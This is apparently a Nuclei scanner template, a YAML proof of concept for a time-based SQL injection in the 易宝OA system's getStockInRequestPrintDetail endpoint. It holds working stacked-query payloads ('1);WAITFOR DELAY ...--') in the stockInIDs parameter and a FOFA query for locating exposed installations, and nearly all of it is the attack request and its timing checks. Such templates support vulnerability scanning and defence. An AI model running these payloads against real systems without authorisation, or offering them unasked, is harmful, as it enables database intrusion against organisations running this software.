id: poc-yaml-yi-bao-oa-system-getstockinrequestprintdetail-sqli
info:
  name: 易宝OA系统 getStockInRequestPrintDetail SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: 易宝OA
    fofa: app="顶讯科技-易宝OA系统"
variables:
  t1: "{{rand_int(5,9)}}"
  t2: "{{to_number(t1) + 2}}"
  t3: "{{rand_int(1,4)}}"
  t4: "{{to_number(t3) + 2}}"
http:
  - raw:
      - |
        GET /SmartTradeScan/StockIn/getStockInRequestPrintDetail?stockInIDs=1);WAITFOR%20DELAY%20%270:0:{{t1}}%27-- HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"message\":"
          - "\"is_succeed\":"
          - "\"data\":null"
      - type: word
        part: header
        words:
          - "application/json"
      - type: dsl
        dsl:
          - duration > to_number(t1)
          - duration < to_number(t2)
  - raw:
      - |
        GET /SmartTradeScan/StockIn/getStockInRequestPrintDetail?stockInIDs=1);WAITFOR%20DELAY%20%270:0:{{t3}}%27-- HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"message\":"
          - "\"is_succeed\":"
          - "\"data\":null"
      - type: word
        part: header
        words:
          - "application/json"
      - type: dsl
        dsl:
          - duration > to_number(t3)
          - duration < to_number(t4)
